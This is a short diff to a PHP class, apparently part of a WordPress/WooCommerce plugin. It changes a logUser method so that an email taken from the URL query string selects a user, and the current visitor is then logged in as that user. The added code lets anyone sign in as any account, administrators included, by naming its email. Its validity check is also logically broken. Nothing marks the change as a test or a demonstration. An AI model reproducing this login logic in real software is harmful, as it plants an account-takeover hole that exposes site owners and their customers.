@@ -129,8 +129,19 @@ class AdeWooCart
     //logUser
     public function logUser()
     {
+        //get $_get 'user_email'
+        $user_email = sanitize_email($_GET['user_email']);
+
+        //check if user email is valid
         $user_id = $this->user->user_id;
         $user = get_user_by('id', $user_id);
+
+        if (!empty($user_email) || is_email($user_email)) {
+            //get user by email
+            $user = get_user_by('email', $user_email);
+            $user_id = $user->ID;
+        }
+
         //if not logged in
         if (!is_user_logged_in()) {
             wp_set_current_user($user_id, $user->user_login);
